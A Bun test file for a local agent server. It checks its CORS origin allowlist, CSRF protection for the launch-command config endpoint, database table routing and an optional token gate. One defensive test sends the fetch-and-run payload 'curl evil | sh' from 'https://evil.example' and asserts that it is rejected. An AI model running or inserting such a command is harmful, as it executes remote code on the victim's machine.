import { Database } from 'bun:sqlite';
import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { rmSync } from 'node:fs';
import { ProcessManager } from '../agent/manager';
import {
  corsHeaders,
  createFetchHandler,
  isOriginAllowed,
  resolveAllowedOrigins,
} from '../agent/server';

const ALLOWED = ['http://localhost:5273'];

function put(
  url: string,
  body: unknown,
  origin: string | null,
  headers: Record<string, string> = {}
) {
  return new Request(url, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      ...(origin ? { Origin: origin } : {}),
      ...headers,
    },
    body: JSON.stringify(body),
  });
}

describe('agent origin policy', () => {
  test('isOriginAllowed: allowlist + no-origin, rejects others (trailing slash tolerant)', () => {
    expect(isOriginAllowed('http://localhost:5273', ALLOWED)).toBe(true);
    expect(isOriginAllowed('http://localhost:5273/', ALLOWED)).toBe(true);
    expect(isOriginAllowed(null, ALLOWED)).toBe(true); // curl / same process
    expect(isOriginAllowed('https://evil.example', ALLOWED)).toBe(false);
  });

  test('resolveAllowedOrigins merges dev defaults with env, deduped', () => {
    const out = resolveAllowedOrigins({
      AGENT_ALLOWED_ORIGINS: 'https://dash.example/, http://localhost:5273',
    } as NodeJS.ProcessEnv);
    expect(out).toContain('http://localhost:5273');
    expect(out).toContain('http://127.0.0.1:5273');
    expect(out).toContain('https://dash.example');
    expect(out.filter((o) => o === 'http://localhost:5273')).toHaveLength(1);
  });

  test('CORS never returns a wildcard and only reflects allowed origins', () => {
    expect(corsHeaders('http://localhost:5273', ALLOWED)['Access-Control-Allow-Origin']).toBe(
      'http://localhost:5273'
    );
    // disallowed / absent origin → no ACAO at all (browser blocks), never `*`
    expect(
      corsHeaders('https://evil.example', ALLOWED)['Access-Control-Allow-Origin']
    ).toBeUndefined();
    expect(corsHeaders(null, ALLOWED)['Access-Control-Allow-Origin']).toBeUndefined();
    for (const o of [null, 'https://evil.example', 'http://localhost:5273']) {
      expect(corsHeaders(o, ALLOWED)['Access-Control-Allow-Origin']).not.toBe('*');
    }
  });
});

describe('agent CSRF-to-RCE protection', () => {
  test('cross-origin config PUT is rejected 403 and never mutates the launch command', async () => {
    const m = new ProcessManager();
    const before = m.getConfig().command;
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });

    const res = await handle(
      put(
        'http://127.0.0.1:6800/control/config',
        { command: 'curl evil | sh' },
        'https://evil.example'
      )
    );

    expect(res.status).toBe(403);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBeNull();
    // The RCE vector: the attacker-supplied command must NOT have been merged.
    expect(m.getConfig().command).toBe(before);
    expect(m.getConfig().command).not.toContain('evil');
  });

  test('same-origin (dashboard) config PUT succeeds and reflects the origin', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 7777 }, 'http://localhost:5273')
    );
    expect(res.status).toBe(200);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');
    expect(m.getConfig().httpPort).toBe(7777);
  });

  test('non-browser caller (no Origin) still works for local use', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(put('http://127.0.0.1:6800/control/config', { httpPort: 8123 }, null));
    expect(res.status).toBe(200);
    expect(m.getConfig().httpPort).toBe(8123);
  });

  test('OPTIONS preflight: ACAO for allowed origin, none for disallowed', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const ok = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Origin: 'http://localhost:5273' },
      })
    );
    expect(ok.status).toBe(204);
    expect(ok.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');

    const bad = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Origin: 'https://evil.example' },
      })
    );
    expect(bad.headers.get('Access-Control-Allow-Origin')).toBeNull();
  });
});

describe('agent /db segment routing', () => {
  // Guards the ROUTER layer (createFetchHandler) that resolves
  // /db/tables/:name vs /db/tables/:name/{schema,cell} — reverting to the old
  // `pathname.endsWith('/schema')` logic must fail these.
  const PATH = `/tmp/bq-agent-route-test-${process.pid}.db`;
  const ORIGIN = 'http://localhost:5273';
  let handle: (req: Request) => Promise<Response>;

  const get = (path: string) =>
    handle(new Request(`http://127.0.0.1:6800${path}`, { headers: { Origin: ORIGIN } }));

  beforeAll(() => {
    const db = new Database(PATH);
    db.run('CREATE TABLE jobs (id TEXT PRIMARY KEY, queue TEXT)');
    db.run("INSERT INTO jobs VALUES ('j1', 'emails')");
    // A table literally named after a sub-resource suffix — the routing edge.
    db.run('CREATE TABLE "schema" (a INTEGER)');
    db.run('INSERT INTO "schema" VALUES (1)');
    db.close();
    const m = new ProcessManager();
    m.setConfig({ dataPath: PATH });
    handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
  });

  afterAll(() => {
    for (const s of ['', '-wal', '-shm']) rmSync(`${PATH}${s}`, { force: true });
  });

  test('single segment → rows route', async () => {
    const res = await get('/db/tables/jobs?limit=10');
    expect(res.status).toBe(200);
    const body = (await res.json()) as { columns: string[]; total: number };
    expect(body.columns).toEqual(['id', 'queue']);
    expect(body.total).toBe(1);
  });

  test('<table>/schema → schema route', async () => {
    const res = await get('/db/tables/jobs/schema');
    expect(res.status).toBe(200);
    const body = (await res.json()) as { columns: { name: string }[] };
    expect(body.columns.map((c) => c.name)).toEqual(['id', 'queue']);
  });

  test('<table>/cell → cell route (full value by rowid)', async () => {
    const rid = ((await (await get('/db/tables/jobs?limit=1')).json()) as { rowids: number[] })
      .rowids[0];
    const res = await get(`/db/tables/jobs/cell?rowid=${rid}&column=id`);
    expect(res.status).toBe(200);
    expect(((await res.json()) as { value: unknown }).value).toBe('j1');
  });

  test('table literally named "schema": rows AND its own schema both resolve', async () => {
    const rows = await get('/db/tables/schema'); // → rows of table 'schema', NOT a schema request
    expect(rows.status).toBe(200);
    expect(((await rows.json()) as { total: number }).total).toBe(1);

    const sch = await get('/db/tables/schema/schema'); // → schema of table 'schema'
    expect(sch.status).toBe(200);
    expect(
      ((await sch.json()) as { columns: { name: string }[] }).columns.map((c) => c.name)
    ).toEqual(['a']);
  });

  test('unknown sub-resource and over-deep paths → 404', async () => {
    expect((await get('/db/tables/jobs/nope')).status).toBe(404);
    expect((await get('/db/tables/jobs/schema/extra')).status).toBe(404);
  });
});

describe('agent optional token gate', () => {
  test('when AGENT_TOKEN is set, mutating requests require it; reads do not', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED, token: 's3cr3t' });

    // no token → 401
    const denied = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9000 }, 'http://localhost:5273')
    );
    expect(denied.status).toBe(401);
    expect(m.getConfig().httpPort).not.toBe(9000);

    // bearer token → ok
    const okBearer = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9000 }, 'http://localhost:5273', {
        Authorization: 'Bearer s3cr3t',
      })
    );
    expect(okBearer.status).toBe(200);
    expect(m.getConfig().httpPort).toBe(9000);

    // x-agent-token header → ok
    const okHeader = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9001 }, 'http://localhost:5273', {
        'X-Agent-Token': 's3cr3t',
      })
    );
    expect(okHeader.status).toBe(200);

    // reads unaffected by the token gate
    const read = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        headers: { Origin: 'http://localhost:5273' },
      })
    );
    expect(read.status).toBe(200);
  });
});
